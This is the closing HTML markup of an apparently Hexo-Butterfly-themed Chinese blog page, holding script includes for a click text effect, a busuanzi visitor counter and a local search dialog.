</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="喵" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>